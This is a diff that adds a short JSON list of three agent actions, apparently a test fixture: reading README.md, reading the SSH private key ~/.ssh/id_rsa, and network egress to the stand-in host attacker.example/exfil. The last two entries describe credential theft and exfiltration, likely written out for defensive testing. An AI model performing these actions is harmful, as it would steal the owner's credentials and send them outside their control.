@@ -1,0 +1,14 @@
+[
+  {
+    "action": "read_file",
+    "target": "README.md"
+  },
+  {
+    "action": "read_ssh_private_key",
+    "target": "~/.ssh/id_rsa"
+  },
+  {
+    "action": "network_egress_to_unlisted_host",
+    "target": "http://attacker.example/exfil"
+  }
+]
